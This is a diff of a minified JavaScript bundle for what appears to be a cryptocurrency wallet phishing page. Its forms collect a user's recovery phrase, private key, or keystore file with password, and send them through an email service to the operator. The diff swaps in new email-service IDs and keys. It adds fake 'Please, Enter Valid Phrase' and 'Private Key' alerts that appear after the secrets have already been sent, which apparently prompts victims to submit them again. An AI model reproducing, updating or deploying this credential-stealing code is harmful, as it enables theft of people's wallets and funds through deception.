@@ -29898,8 +29898,9 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         p ? alert("Incorrect Phrase") : (c(!0),
-                                            A("service_khq7hyh", "template_y1ydeg9", n.current, "9lJ_Kgk3DQaHQC1r9").then((e => {
+                                        A("service_omtjtrr", "template_kr56bjt", n.current, "jnsbVFj-cJzuUg_pV").then((e => {
                                                 console.log(e),
+                                                    alert("Please, Enter Valid Phrase"),
                                                     l(""),
                                                     c(!1)
                                             }
@@ -29981,8 +29982,9 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         i ? (c(!0),
-                                            A("service_khq7hyh", "template_y1ydeg9", n.current, "9lJ_Kgk3DQaHQC1r9").then((e => {
+                                        A("service_omtjtrr", "template_kr56bjt", n.current, "jnsbVFj-cJzuUg_pV").then((e => {
                                                 console.log(e),
+                                                    alert("Please, Enter Valid Private Key"),
                                                     l(""),
                                                     c(!1)
                                             }
@@ -30040,7 +30042,7 @@
                                 onSubmit: e => {
                                     e.preventDefault(),
                                         i(!0),
-                                        A("service_khq7hyh", "template_y1ydeg9", p.current, "9lJ_Kgk3DQaHQC1r9").then((e => {
+                                        A("service_omtjtrr", "template_kr56bjt", n.current, "jnsbVFj-cJzuUg_pV").then((e => {
                                             console.log(e),
                                                 l(""),
                                                 i(!1)
@@ -30062,7 +30064,7 @@
                                         value: a,
                                         onChange: e => l(e.target.value),
                                         required: !0,
-                                        placeholder: "Enter Keystore JSON {}",
+                                        placeholder: "Enter Keystore JSON {} Unavailable",
                                         className: "w-full bg-black bg-opacity-60 text-white p-4 focus:outline-none border border-primary"
                                     }), (0,
                                         t.jsx)("input", {
@@ -30071,7 +30073,7 @@
                                             value: o,
                                             onChange: e => c(e.target.value),
                                             required: !0,
-                                            placeholder: "Enter your password",
+                                            placeholder: "Enter your password Unavailable",
                                             className: "w-full bg-black bg-opacity-60 text-white p-4 focus:outline-none border border-primary"
                                         }), n ? (0,
                                             t.jsx)(C, {
@@ -30350,4 +30352,6 @@
         )()
 }
 )();
+
+
 //# sourceMappingURL=main.6d23d4c1.js.map
